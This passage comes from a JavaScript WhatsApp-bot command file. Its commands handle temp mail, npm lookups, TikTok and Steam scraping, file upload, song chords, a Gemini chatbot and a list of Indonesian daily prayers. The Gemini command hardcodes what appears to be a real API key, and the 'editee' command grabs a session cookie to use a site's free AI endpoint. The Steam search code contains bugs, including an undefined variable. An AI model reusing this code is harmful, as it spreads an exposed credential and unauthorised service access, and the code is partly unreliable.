        reply(`You already have a temporary email:\n\n📧 Email: ${tempMailData[m.sender].email}\n\nUse *${prefix}checkmail* to check your inbox.`);
    }
    break;
}

// Check Emails
case "checkmails":
case "readmail":
case "reademail": {
    const userMail = tempMailData[m.sender];
    if (!userMail) {
        return reply(`You don't have a temporary email. Use *${prefix}tempmail* to create one.`);
    }

    try {
        // Get the list of emails in the inbox using the 1SecMail API
        const login = userMail.email.split('@')[0];
        const domain = userMail.email.split('@')[1];
        const response = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`);
        
        const inbox = response.data;
        if (!inbox || inbox.length === 0) {
            return reply(`*EMPTY ➪ No mails received yet!* \nUse *${prefix}delmail* to delete mail!`);
        }

        let messageList = "*📩 Your Emails:*\n\n";
        for (const email of inbox) {
            messageList += `*📧 From:* ${email.from}\n*🗓️ Date:* ${email.date}\n*✉️ Subject:* ${email.subject}\n*🔑 ID:* ${email.id}\n\n`;
        }
        reply(messageList.trim());
    } catch (error) {
        console.error(error);
        reply("An error occurred while checking emails. Please try again.");
    }
    break;
}

// Delete Temporary Email
case "delmail":
case "deletemail":
case "deltemp":
case "deltmp": {
    const userMail = tempMailData[m.sender];
    if (userMail) {
        try {
            // Delete the temporary email using the 1SecMail API
            const login = userMail.email.split('@')[0];
            const domain = userMail.email.split('@')[1];
            const response = await axios.get(`https://www.1secmail.com/api/v1/?action=deleteMailbox&login=${login}&domain=${domain}`);
            
            // Check the API response for success
            if (response.data.result === 'success') {
                delete tempMailData[m.sender]; // Remove the email from local storage
                reply("Your temporary email has been deleted.");
            } else {
                reply("Failed to delete your temporary email. Please try again.");
            }
        } catch (error) {
            console.error(error);
            reply("An error occurred while deleting your temporary email. Please try again.");
        }
    } else {
        reply("You don't have a temporary email to delete.");
    }
    break;
}



case 'npmstalk': {
  if (!text) return reply("Example: .npmstalk axios")
async function npmstalk(packageName) {
  let stalk = await axios.get("https://registry.npmjs.org/"+packageName)
  let versions = stalk.data.versions
  let allver = Object.keys(versions)
  let verLatest = allver[allver.length-1]
  let verPublish = allver[0]
  let packageLatest = versions[verLatest]
  return {
    name: packageName,
    versionLatest: verLatest,
    versionPublish: verPublish,
    versionUpdate: allver.length,
    latestDependencies: Object.keys(packageLatest.dependencies).length,
    publishDependencies: Object.keys(versions[verPublish].dependencies).length,
    publishTime: stalk.data.time.created,
    latestPublishTime: stalk.data.time[verLatest]
  }
}
try {
let jut = await npmstalk(text)
let ahwoi = `[ *NPM STALK* ]

Name: ${jut.name}
Version Latest: ${jut.versionLatest}
Version Publish: ${jut.versionPublish}
Version Update: ${jut.versionUpdate}
Latest Dependencies: ${jut.latestDependencies}
Publish Dependencies: ${jut.publishDependencies}
Publish Time: ${jut.publishTime}
Latest Publish Time: ${jut.latestPublishTime}
`
David.sendMessage(m.chat, {text: ahwoi}, {quoted: m})
} catch (error) {
  m.reply(error.message)
}
}
break
case 'editee': {
    if (!q) return m.reply(`_Ask App?`);
// wm avz
    async function getSession() {
        const res = await axios.get("https://editee.com/chat-gpt");
        return res.headers['set-cookie'] ? res.headers['set-cookie'][0].split(';')[0].split('=')[1] : null;
    }
// wm avz
    async function avz(query) {
        const sessionCookie = await getSession();
        const headers = {
            "content-type": "application/json",
            "cookie": `editeecom_session=${sessionCookie}`,
            "user-agent": "Mozilla/5.0",
            "x-requested-with": "XMLHttpRequest"
        };
// wm avz
        const response = await axios.post("https://editee.com/submit/chatgptfree", {
            context: " ",
            selected_model: "gemini",
            important: `aV77OsKy`, // ubah aja kalau mau error wkwk
            user_input: query
        }, { headers });
// wm avz
        return response.data;
    }
// wm avz
    try {
        const answer = await avz(q);
        m.reply(answer.text);
    } catch (error) {
        console.error("Error :", error);
        m.reply("Happen ?.");
    }
}
break
        
        case 'ttslide': {
    let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`

    if (!text) return m.reply(input)

    if (!(text.includes('http://') || text.includes('https://'))) return m.reply(`url invalid, please input a valid url. Try with add http:// or https://`)
    if (!text.includes('tiktok.com')) return m.reply(`Invalid Tiktok URL.`)
    
    async function tiktok(url) {
    try {
        const data = new URLSearchParams({
            'id': url,
            'locale': 'id',
            'tt': 'RFBiZ3Bi'
        });

        const headers = {
            'HX-Request': true,
            'HX-Trigger': '_gcaptcha_pt',
            'HX-Target': 'target',
            'HX-Current-URL': 'https://ssstik.io/id',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Referer': 'https://ssstik.io/id'
        };

        const response = await axios.post('https://ssstik.io/abc?url=dl', data, {
            headers
        });
        const html = response.data;

        const $ = cheerio.load(html);

        const author = $('#avatarAndTextUsual h2').text().trim();
        const title = $('#avatarAndTextUsual p').text().trim();
        const video = $('.result_overlay_buttons a.download_link').attr('href');
        const audio = $('.result_overlay_buttons a.download_link.music').attr('href');
        const imgLinks = [];
        $('img[data-splide-lazy]').each((index, element) => {
            const imgLink = $(element).attr('data-splide-lazy');
            imgLinks.push(imgLink);
        });

        const result = {
            author,
            title,
            result: video || imgLinks,
            audio
        };
        return result
    } catch (error) {
        console.error('Error:', error);
        return null;
    }
}

try {
    const {
        result } = await tiktok(text);
    m.reply(mess.wait)
    let no = 1
    for (let i of result) {
        David.sendMessage(m.sender, {image: {url: i}, caption: `Picture to - ${no++}`}, {quoted: m})
}
} catch (error) {
 m.reply(error)
}
}
break
        
        case 'steamsearch': {
  if (!q) return reply("Example: .steamsearch honkai impact")
async function Steam(search) {
  return new Promise(async (resolve, reject) => {
    try {
      const { data, status } = await axios.get('https://store.steampowered.com/search/?term=' + search)
      const $ = cheerio.load(data)
      const hasil = []
      $('#search_resultsRows > a').each((a, b) => {
        const link = $(b).attr('href')
        const judul = $(b).find(`div.responsive_search_name_combined > div.col.search_name.ellipsis > span`).text()
        const harga = $(b).find(`div.responsive_search_name_combined > div.col.search_price_discount_combined.responsive_secondrow > div.col.search_price.responsive_secondrow `).text().replace(/ /g, '').replace(/\n/g, '')
        var rating = $(b).find(`div.responsive_search_name_combined > div.col.search_reviewscore.responsive_secondrow > span`).attr('data-tooltip-html')
        const img = $(b).find(`div.col.search_capsule > img`).attr('src')
        const rilis = $(b).find(`div.responsive_search_name_combined > div.col.search_released.responsive_secondrow`).text()

        if (typeof rating === 'undefined') {
          var rating = 'no ratings'
        }
        if (rating.split('<br>')) {
          let hhh = rating.split('<br>')
          var rating = `${hhh[0]} ${hhh[1]}`
        }
        hasil.push({
          Title: judul,
          img: img,
          link: link,
          rilis: rilis,
          harga: harga ? Sold : 'no price',
          rating: rating
        })
      })
      if (hasil.every(x => x === undefined)) return resolve({ developer: '@xorizn', mess: 'no result found' })
      resolve(hasil)
    } catch (err) {
      console.error(err)
    }
  })
}
Steam(q).then(results => {
 if (results.length === 0) {
 m.reply('No results found.');
 return;
 }
 
 let replyTextt = `Search results for "${q}":\n\n`;
 results.forEach((hasil, index) => {
 replyTextt += `${index + 1}. ${hasil.judul}\nPrice: ${hasil.harga}\nLink: ${hasil.link}\nRelease: ${hasil.rilis}\nRating: ${hasil.rating}\n\n`;
 });
 
 m.reply(replyTextt);
 }).catch(error => {
 m.reply('An error occurred while searching for games on Steam.');
 console.error(error);
 });
}
break
        
        case 'top4top': {
  const request = require("request")
const { fromBuffer } = require('file-type');
async function top4top(baper) {
	return new Promise(async (resolve, reject) => {
		const {
			ext
		} = await fromBuffer(baper) || {}
		var req = await request({
				url: "https://top4top.io/index.php",
				method: "POST",
				"headers": {
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"accept-language": "en-US,en;q=0.9,id;q=0.8",
					"cache-control": "max-age=0",
					'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryAmIhdMyLOrbDawcA',
					'User-Agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.585 Mobile Safari/534.11+'
				}
			},
			function(error, response, body) {
				if (error) { return resolve({
					result: 'error'
				}) }
				const $ = cheerio.load(body)
				let result = $('div.alert.alert-warning > ul > li > span').find('a').attr('href') || "gagal"
				if (result == "gagal") {
					resolve({
						status: "error",
						msg: "maybe file not allowed or try another file"
					})
				}
				resolve({
					status: "sukses",
					result
				})
			});
		let form = req.form()
		form.append('file_1_', baper, {
			filename: `${Math.floor(Math.random() * 10000)}.` + `${ext}`
		})
		form.append('file_1_', '')
		form.append('submitr', '[ رفع الملفات ]')
	})
}
let spas = "                "
    let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!/image/g.test(mime)) reply("Reply Gambar Aja")
  let media = await q.download()
  let link = await top4top(media)
  let { result, status } = link
  let caption = `*[ ${status.toUpperCase()} ]*

📮 *L I N K :*
${result}
📊 *S I Z E :* ${media.length} Byte
`

reply(caption)
}
break
        
        case 'chord': {
async function chord(query) {
 return new Promise(async (resolve, reject) => {
 try {
 const head = {
 "User-Agent": "Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
 "Cookie": "__gads=ID=4513c7600f23e1b2-22b06ccbebcc00d1:T=1635371139:RT=1635371139:S=ALNI_MYShBeii6AFkeysWDKiD3RyJ1106Q; _ga=GA1.2.409783375.1635371138; _gid=GA1.2.1157186793.1635371140; _fbp=fb.1.1635371147163.1785445876"};
 
 const { data } = await axios.get(`http://app.chordindonesia.com/?json=get_search_results&exclude=date,modified,attachments,comment_count,comment_status,thumbnail,thumbnail_images,author,excerpt,content,categories,tags,comments,custom_fields&search=${query}`, { headers: head });
 
 const anu = await axios.get(`http://app.chordindonesia.com/?json=get_post&id=${data.posts[0].id}`, { headers: head });
 
 let $ = cheerio.load(anu.data.post.content);
 
 resolve({
 title: $("img").attr("alt"),
 chord: $("pre").text().trim()
 });
 } catch (error) {
 reject(error);
 }
 });
}

if (!text) return m.reply('Input Judul Lagu');
 
let query = text.replace(/\s/g, '+'); // Mengganti spasi dengan "+"
let a = await chord(query);
 
m.reply(`*Song :* ${a.title}\n*Chord :*\n\n${a.chord}`);
};
break
case 'tomoe': {
    if (!text) {
        return m.reply(`Example: .tomoe Hi`);
    }

const sendToGemini = async (prompt) => {
    const apiKey = 'AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ'; // Dapatkan apikey dari  https://aistudio.google.com/app/apikey
    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=${apiKey}`;
    
    const body = {
        contents: [
            {
                parts: [
                    { text: prompt }
                ]
            }
        ]
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(body)
        });

        const data = await response.json();

        if (response.ok) {
            return data; 
        } else {
            throw new Error(data.error.message || 'Request failed');
        }
    } catch (error) {
        console.error('Error:', error.message);
        return null;
    }
};

    m.reply("Tomoe is thinking....");
    const prompt = `Your name is tomoe, you are a virtual assistant developed directly from google.`;
    const combinedPrompt = `${prompt} ${text}`;
    try {
        // Mengirim prompt ke API Gemini
        const response = await sendToGemini(combinedPrompt);

        if (response) {
            const candidates = response.candidates;
            let message = candidates && candidates.length > 0
                ? candidates[0].content.parts[0].text
                : 'No response received from model.';
            
            // Mengganti ** dengan * dan mengedit jawaban jika perlu
            message = message.replace(/\*\*/g, '*').replace(/#{2,}/g, '#');

            // Mengirim respons dari Gemini ke user
            await David.sendMessage(m.chat, { text: message }, { quoted: m });
        } else {
            await David.sendMessage(
                m.chat,
                { text: 'Failed to get a response from Gemini.' },
                { quoted: m }
            );
        }
    } catch (error) {
        console.error(error);
        await David.sendMessage(
            m.chat,
            { text: 'An error occurred while processing your request.' },
            { quoted: m }
        );
    }
}
break
case 'waifu': {
const waifud = await fetchJson 
(`https://pic.re/image.json`)
const waifut = "https://" + waifud.file_url
  David.sendMessage(from, { image: { url: waifut }, caption: `Hell nah\n\nSize: ${waifud.file_size}` }, { quoted: m })
}
break
case 'doaharian': {
var pripayerr = [
  {
    "id": "1",
    "doa": "Doa sebelum tidur",
    "ayat": "بِسْمِكَ االلّٰهُمَّ اَحْيَا وَبِاسْمِكَ اَمُوْتُ",
    "latin": "Bismikallaahumma ahyaa wa ammuut",
    "artinya": "Dengan menyebut nama Allah, aku hidup dan aku mati"
  },
  {
    "id": "2",
    "doa": "Doa bangun tidur",
    "ayat": "اَلْحَمْدُ ِللهِ الَّذِىْ اَحْيَانَا بَعْدَمَآ اَمَاتَنَا وَاِلَيْهِ النُّشُوْرُ",
    "latin": "Alhamdu lillahil ladzii ahyaanaa ba’da maa amaa tanaa wa ilahin nusyuuru",
    "artinya": "Segala puji bagi Allah yang telah menghidupkan kami sesudah kami mati (membangunkan dari tidur) dan hanya kepada-Nya kami dikembalikan"
  },
  {
    "id": "3",
    "doa": "Doa masuk kamar mandi",
    "ayat": "اَللّٰهُمَّ اِنّىْ اَعُوْذُبِكَ مِنَ الْخُبُثِ وَالْخَبَآئِثِ",
    "latin": "Allahumma Innii a'uudzubika minal khubutsi wal khoaaitsi",
    "artinya": "Ya Allah, aku berlindung pada-Mu dari godaan setan laki-laki dan setan perempuan"
  },
  {
    "id": "4",
    "doa": "Doa ketika bercermin",
    "ayat": "اَلْحَمْدُ ِللهِ كَمَا حَسَّنْتَ خَلْقِىْ فَحَسِّـنْ خُلُقِىْ",
    "latin": "Alhamdulillaahi kamaa hassanta kholqii fahassin khuluqii",
    "artinya": "Segala puji bagi Allah, baguskanlah budi pekertiku sebagaimana Engkau telah membaguskan rupa wajahku"
  },
  {
    "id": "5",
    "doa": "Doa keluar rumah",
    "ayat": "بِسْمِ اللهِ تَوَكَّلْتُ عَلَى اللهِ لاَحَوْلَ وَلاَقُوَّةَ اِلاَّ بِالله",
    "latin": "Bismillaahi tawakkaltu 'alalloohi laa hawlaa walaa quwwata illaa bilaahi",
    "artinya": "Dengan menyebut nama Allah aku bertawakal kepada Allah, tiada daya kekuatan melainkan dengan pertolongan Allah."
  },
  {
    "id": "6",
    "doa": "Doa masuk rumah",
    "ayat": "اَللّٰهُمَّ اِنّىْ اَسْأَلُكَ خَيْرَالْمَوْلِجِ وَخَيْرَالْمَخْرَجِ بِسْمِ اللهِ وَلَجْنَا وَبِسْمِ اللهِ خَرَجْنَا وَعَلَى اللهِ رَبّنَا تَوَكَّلْنَا",
    "latin": "Allahumma innii as-aluka khoirol mauliji wa khoirol makhroji bismillaahi wa lajnaa wa bismillaahi khorojnaa wa'alallohi robbina tawakkalnaa",
    "artinya": "Ya Allah, sesungguhnya aku mohon kepada-Mu baiknya tempat masuk dan baiknya tempat keluar dengan menyebut nama Allah kami masuk, dan dengan menyebut nama Allah kami keluar dan kepada Allah Tuhan kami, kami bertawakkal"
  },
  {
    "id": "7",
    "doa": "Doa memohon ilmu yang bermanfaat",
    "ayat": "اَللّٰهُمَّ اِنِّى اَسْأَلُكَ عِلْمًا نَافِعًا وَرِزْقًا طَيِّبًا وَعَمَلاً مُتَقَبَّلاً",
    "latin": "Allahumma innii as-aluka 'ilmaan naafi'aan wa rizqoon thoyyibaan wa 'amalaan mutaqobbalaan",
    "artinya": "Ya Allah, sesungguhnya aku mohon kepada-Mu ilmu yang berguna, rezki yang baik dan amal yang baik Diterima. (H.R. Ibnu Majah)"
  },
  {
    "id": "8",
    "doa": "Doa sebelum belajar",
    "ayat": "يَارَبِّ زِدْنِىْ عِلْمًا وَارْزُقْنِىْ فَهْمًا",
    "latin": "Yaa robbi zidnii 'ilman warzuqnii fahmaa",
    "artinya": "Ya Allah, tambahkanlah aku ilmu dan berikanlah aku rizqi akan kepahaman"
  },
  {
    "id": "9",
    "doa": "Doa sesudah belajar",
    "ayat": "اَللّٰهُمَّ اِنِّى اِسْتَوْدِعُكَ مَاعَلَّمْتَنِيْهِ فَارْدُدْهُ اِلَىَّ عِنْدَ حَاجَتِىْ وَلاَ تَنْسَنِيْهِ يَارَبَّ الْعَالَمِيْنَ",
    "latin": "Allaahumma innii astaudi'uka maa 'allamtaniihi fardud-hu ilayya 'inda haajatii wa laa tansaniihi yaa robbal 'alamiin",
    "artinya": "Ya Allah, sesungguhnya aku menitipkan kepada Engkau ilmu-ilmu yang telah Engkau ajarkan kepadaku, dan kembalikanlah kepadaku sewaktu aku butuh kembali dan janganlah Engkau lupakan aku kepada ilmu itu wahai Tuhan seru sekalian alam."
  },
  {
    "id": "10",
    "doa": "Doa sebelum wudhu",
    "ayat": "نَوَيْتُ الْوُضُوْءَ لِرَفْعِ الْحَدَثِ اْلاَصْغَرِ فَرْضًا لِلّٰهِ تَعَالَى",
    "latin": "Nawaitul whudu-a lirof'il hadatsii ashghori fardhon lillaahi ta'aalaa",
    "artinya": "Saya niat berwudhu untuk menghilangkan hadast kecil fardu (wajib) karena Allah ta'ala"
  },
  {
    "id": "11",
    "doa": "Doa setelah wudhu",
    "ayat": "اَشْهَدُ اَنْ لاَّاِلَهَ اِلاَّاللهُ وَحْدَهُ لاَشَرِيْكَ لَهُ وَاَشْهَدُ اَنَّ مُحَمَّدًاعَبْدُهُ وَرَسُوْلُهُ. اَللّٰهُمَّ اجْعَلْنِىْ مِنَ التَّوَّابِيْنَ وَاجْعَلْنِىْ مِنَ الْمُتَطَهِّرِيْنَ، وَجْعَلْنِيْ مِنْ عِبَادِكَ الصَّالِحِيْنَ",
    "latin": "Asyhadu allaa ilaaha illalloohu wahdahuu laa syariika lahu wa asyhadu anna muhammadan ‘abduhuuwa rosuuluhuu, alloohummaj’alnii minat tawwaabiina waj’alnii minal mutathohhiriina, waj'alnii min 'ibadikash shaalihiina.",
    "artinya": "Aku bersaksi, tidak ada Tuhan selain Allah Yang Maha Esa, tidak ada sekutu bagi-Nya, dan aku mengaku bahwa Nabi Muhammad itu adalah hamba dan Utusan Allah. Ya Allah, jadikanlah aku dari golongan orang-orang yang bertaubat dan jadikanlah aku dari golongan orang-orang yang suci dan jadikanlah aku dari golongan hamba-hamba Mu yang shaleh"
  },
  {
    "id": "12",
    "doa": "Doa sebelum membaca al-qur'an",
    "ayat": "اَللّٰهُمَّ افْتَحْ عَلَىَّ حِكْمَتَكَ وَانْشُرْ عَلَىَّ رَحْمَتَكَ وَذَكِّرْنِىْ مَانَسِيْتُ يَاذَاالْجَلاَلِ وَاْلاِكْرَامِ",
    "latin": "Allahummaftah 'alayya hikmataka wansyur 'alayya rohmataka wa dzakkirnii maanasiitu yaa dzal jalaali wal ikhroomi",
    "artinya": "Ya Allah bukakanlah hikmahMu padaku, bentangkanlah rahmatMu padaku dan ingatkanlah aku terhadap apa yang aku lupa, wahai Dzat yang memiliki keagungan dan kemuliaan"
  },
  {
    "id": "13",
    "doa": "Doa setelah membaca al-qur'an",
    "ayat": "اَللّٰهُمَّ ارْحَمْنِىْ بِالْقُرْآنِ. وَاجْعَلْهُ لِىْ اِمَامًا وَنُوْرًا وَّهُدًى وَّرَحْمَةً. اَللّٰهُمَّ ذَكِّرْنِىْ مِنْهُ مَانَسِيْتُ وَعَلِّمْنِىْ مِنْهُ مَاجَهِلْتُ. وَارْزُقْنِىْ تِلاَ وَتَهُ آنَآءَ اللَّيْلِ وَاَطْرَافَ النَّهَارٍ. وَاجْعَلْهُ لِىْ حُجَّةً يَارَبَّ الْعَالَمِيْنَ",
    "latin": "Allahummarhamnii bil qur'aani. waj'alhu lii imaaman wa nuuran wa hudan wa rohman. Allahumma dzakkirnii minhu maa nasiitu wa'allimnii minhu maa jahiltu. wazuqnii tilaa watahu aanaa-al laili wa athroofan nahaari. waj'alhu lii hujjatan yaa robbal 'aalamiina.",
    "artinya": "Ya Allah, rahmatilah aku dengan Al-Quran yang agung, jadikanlah ia bagiku ikutan cahaya petunjuk rahmat. Ya Allah, ingatkanlah apa yang telah aku lupa dan ajarkan kepadaku apa yang tidak aku ketahui darinya, anugerahkanlah padaku kesempatan membacanya pada sebagian malam dan siang, jadikanlah ia hujjah yang kuat bagiku, wahai Tuhan seru sekalian alam."
  },
  {
    "id": "14",
    "doa": "Doa sebelum mandi",
    "ayat": "اَللّٰهُمَّ اغْفِرْلِى ذَنْبِى وَوَسِّعْ لِى فِىْ دَارِىْ وَبَارِكْ لِىْ فِىْ رِزْقِىْ",
    "latin": "Allahummaghfirlii dzambii wa wassi'lii fii daarii wa baarik lii fii rizqii",
    "artinya": "Ya Allah ampunilah dosa kesalahanku dan berilah keluasaan di rumahku serta berkahilah pada rezekiku"
  },
  {
    "id": "15",
    "doa": "Doa hendak berpergian",
    "ayat": "اَللّٰهُمَّ هَوِّنْ عَلَيْنَا سَفَرَنَا هَذَا وَاطْوِعَنَّابُعْدَهُ اَللّٰهُمَّ اَنْتَ الصَّاحِبُ فِى السَّفَرِوَالْخَلِيْفَةُفِى الْاَهْلِ",
    "latin": "Allahumma hawwin 'alainaa safaranaa hadzaa waatwi 'annaa bu'dahu. Alloohumma antashookhibu fiissafari walkholiifatu fiil ahli",
    "artinya": "Ya Allah, mudahkanlah kami berpergian ini, dan dekatkanlah kejauhannya. Ya Allah yang menemani dalam berpergian, dan Engkau pula yang melindungi keluarga."
  },
  {
    "id": "16",
    "doa": "Doa ketika sampai di tempat tujuan",
    "ayat": "اَلْحَمْدُ ِللهِ الَّذِى سَلَمَنِى وَالَّذِى اَوَنِى وَالَّذِى جَمَعَ الشَّمْلَ بِ",
    "latin": "Alhamdulillahil ladzi sallamani wal ladzi awani wal ladzi jama’asy syamla bi",
    "artinya": "Segala puji bagi Allah, yang telah menyelamatkan akau dan yang telah melindungiku dan yang mengumpulkanku dengan keluargaku."
  },
  {
    "id": "17",
    "doa": "Doa memakai pakaian",
    "ayat": "بِسْمِ اللهِ اَللّٰهُمَّ اِنِّى اَسْأَلُكَ مِنْ خَيْرِهِ وَخَيْرِ مَاهُوَ لَهُ وَاَعُوْذُبِكَ مِنْ شَرِّهِ وَشَرِّمَا هُوَلَهُ",
    "latin": "Bismillaahi, Alloohumma innii as-aluka min khoirihi wa khoiri maa huwa lahuu wa'a'uu dzubika min syarrihi wa syarri maa huwa lahuu",
    "artinya": "Dengan nama-Mu yaa Allah akku minta kepada Engkau kebaikan pakaian ini dan kebaikan apa yang ada padanya, dan aku berlindung kepada Engkau dari kejahatan pakaian ini dan kejahatan yang ada padanya"
  },
  {
    "id": "18",
    "doa": "Doa memakai pakaian baru",
    "ayat": " اَلْحَمْدُ لِلّٰهِ الَّذِىْ كَسَانِىْ هَذَا وَرَزَقَنِيْهِ مِنْ غَيْرِ حَوْلٍ مِنِّىْ وَلاَقُوَّةٍ",
    "latin": "Alhamdu lillaahil ladzii kasaanii haadzaa wa rozaqoniihi min ghoiri hawlim minni wa laa quwwatin",
    "artinya": "Segala puji bagi Allah yang memberi aku pakaian ini dan memberi rizeki dengan tiada upaya dan kekuatan dariku"
  },
  {
    "id": "19",
    "doa": "Doa melepas pakaian",
    "ayat": "بِسْمِ اللهِ الَّذِيْ لاَ إِلَهَ إِلَّا هُوَ",
    "latin": "Bismillaahil ladzii laa ilaaha illaa huwa",
    "artinya": "Dengan nama Allah yang tiada Tuhan selain-Nya"
  },
  {
    "id": "20",
    "doa": "Doa menjelang sholat subuh",
    "ayat": "اَللّٰهُمَّ اِنِّى اَعُوْذُ بِكَ مِنْ ضِيْقِ الدُّنْيَا وَضِيْقِ يَوْمِ الْقِيَامَةِ",
    "latin": "Allaahumma inni a'udzubika min dzhiiqid-dunyaa wa dzhiiqi yaumal-qiyaamati",
    "artinya": "Ya Allah! Sesungguhnya aku berlindung kepada-Mu dari kesempitan dunia dan kesempitan hari kiamat. (HR. Abu Daud)"
  },
  {
    "id": "21",
    "doa": "Doa menyambut pagi hari",
    "ayat": "اَللّٰهُمَّ بِكَ اَصْبَحْنَا وَبِكَ اَمْسَيْنَا وَبِكَ نَحْيَا وَبِكَ نَمُوْتُ وَاِلَيْكَ النُّشُوْرُ",
    "latin": "Alloohumma bika ashbahnaa wa bika amsainaa wa bika nahyaa wa bika namuutu wa ilaikan nusyuuru",
    "artinya": "Ya Allah, karena Engkau kami mengalami waktu pagi dan waktu petang, dan karena Engkau kami hidup dan mati dan kepada-Mu juga kami akan kembali."
  },
  {
    "id": "22",
    "doa": "Doa menyambut sore hari",
    "ayat": "اَللّٰهُمَّ بِكَ اَمْسَيْنَا وَبِكَ اَصْبَحْنَا وَبِكَ نَحْيَا وَبِكَ نَمُوْتُ وَاِلَيْكَ الْمَصِيْرُ",
    "latin": "Allahumma bika amsainaa wa bika ashbahnaa wa bika nahyaa wa bika namuutu wa ilaikal mashiir",
    "artinya": "Ya Allah, karena Engkau kami mengalami waktu petang dan waktu pagi, karena Engkau kami hidup dan mati dan kepada-Mu juga kami akan kembali."
  },
  {
    "id": "23",
    "doa": "Doa bercermin",
    "ayat": "اللَّهُمَّ كَمَا حَسَّنْتَ خَلْقِي فَحَسِّنْ خُلُقِي",
    "latin": "Alloohumma kamaa hassanta kholqii fahassin khuluqi",
    "artinya": "Ya Allah, sebagaimana Engkau baguskan tubuhku, maka baguskanlah akhlaqku"
  },
  {
    "id": "24",
    "doa": "Doa pergi ke masjid",
    "ayat": "اللَّهُمَّ اجْعَلْ فِى قَلْبِى نُورًا . وَفِى بَصَرِى نُورًا . وَفِى سَمْعِى نُورًا . وَعَنْ يَمِينِى نُورًا . وَعَنْ يَسَارِى نُورًا . وَفَوْقِى نُورًا . وَتَحْتِى نُورًا . وَأَمَامِى نُورًا . وَخَلْفِى نُورًا . وَاجْعَلْ لِى نُورًا",
    "latin": "Alloohummaj’al fii qolbi nuuron. Wa fii bashori nuuron. Wa fii sam’i nuuron. Wa ‘an yamiinii nuuron. Wa ‘ay yasaarii nuuron. Wa fauqi nuuron. Wa tahti nuuron. Wa amaamii nuuron. Wakholqi nuuron. Waj’al lii nuuron",
    "artinya": "Ya Allah, jadikanlah di dalam hatiku cahaya. Dalam penglihatanku cahaya. Pada pendengaranku cahaya. Sebelah kananku cahaya. Sebelah kiriku cahaya. Atasku cahaya. Bawahku cahaya. Depanku cahaya. Belakangku cahaya. Dan berikanlah cahaya kepadaku."
  },
  {
    "id": "25",
    "doa": "Doa masuk masjid",
    "ayat": "اللَّهُمَّ افْتَحْ لِى أَبْوَابَ رَحْمَتِكَ",
    "latin": "Alloohummaf tahlii abwaaba rohmatik",
    "artinya": "Ya Allah, bukakanlah pintu-pintu rahmatMu untukku"
  },
  {
    "id": "26",
    "doa": "Doa keluar masjid",
    "ayat": "اللَّهُمَّ إِنِّى أَسْأَلُكَ مِنْ فَضْلِكَ",
    "latin": "Alloohumma innii as-aluka min fadllik",
    "artinya": "Ya Allah, sesungguhnya aku memohon keutamaan kepadaMu"
  },
  {
    "id": "27",
    "doa": "Doa setelah adzan",
    "ayat": "اللَّهُمَّ رَبَّ هَذِهِ الدَّعْوَةِ التَّامَّةِ وَالصَّلاَةِ الْقَائِمَةِ آتِ مُحَمَّدًا الْوَسِيلَةَ وَالْفَضِيلَةَ وَابْعَثْهُ مَقَامًا مَحْمُودًا الَّذِى وَعَدْتَهُ",
    "latin": "Alloohumma robba haadzihid da’watit taammah washsholaatil qoo-imah. Aati Muhammadanil wasiilata wal fadliilah. Wab’atshu maqooman mahmuudanil ladzii wa ‘adtah",
    "artinya": "Ya Allah, Tuhan panggilan yang sempurna dan shalat yang akan didirikan ini. Berikanlah wasilah dan keutamaan kepada Muhammad. Bangkitkanlah dia pada kedudukan yang terpuji seperti yang Engkau janjikan kepadanya."
  },
  {
    "id": "28",
    "doa": "Doa naik kendaraan",
    "ayat": "سُبْحَانَ الَّذِى سَخَّرَ لَنَا هَذَا وَمَا كُنَّا لَهُ مُقْرِنِينَ وَإِنَّا إِلَى رَبِّنَا لَمُنْقَلِبُونَ",
    "latin": "Subhaanal ladzii sakhkhoro lanaa haadzaa wamaa kunnaa lahuu muqriniin. Wa innaa ilaa robbinaa lamunqolibuun",
    "artinya": "Mahasuci Dia yang telah menundukkan semua ini bagi kami padahal sebelumnya kami tidak mampu menguasainya. Dan sesungguhnya kami akan kembali kepada Tuhan kami."
  },
  {
    "id": "29",
    "doa": "Doa masuk pasar",
    "ayat": "لاَ إِلَهَ إِلاَّ اللَّهُ وَحْدَهُ لاَ شَرِيكُ لَهُ لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ يُحْيِى وَيُمِيتُ وَهُوَ حَىٌّ لاَ يَمُوتُ بِيَدِهِ الْخَيْرُ وَهُوَ عَلَى كُلِّ شَىْءٍ قَدِيرٌ",
    "latin": "Laa ilaaha illalloohu wahdahu laa syariikalah. Lahul mulku walahul hamdu. Yuhyii wa yumiitu wahuwa hayyun laa yamuut. Biyadihil khoir wahuwa ‘alaa kulli syai-in qodiir",
    "artinya": "Tiada tuhan selain Allah Yang Maha Esa, tiada sekutu bagiNya. Dia yang mempunyai kerajaan dan segala pujian. Dialah yang menghidupkan dan mematikan, dan Dia Mahahidup yang tidak mati. Di tangan-Nya segala kebaikan dan Dia Mahakuasa atas segala sesuatu."
  },
  {
    "id": "30",
    "doa": "Doa sebelum makan",
    "ayat": "اَللّٰهُمَّ بَارِكْ لَنَا فِيْمَا رَزَقْتَنَا وَقِنَا عَذَابَ النَّارِ",
    "latin": "Allahumma baarik lanaa fiimaa rozaqtanaa wa qinaa 'adzaa bannaar.",
    "artinya": "Ya Allah, berkahilah kami dalam rezeki yang telah Engkau berikan kepada kami dan peliharalah kami dari siksa api neraka"
  },
  {
    "id": "31",
    "doa": "Doa sesudah makan",
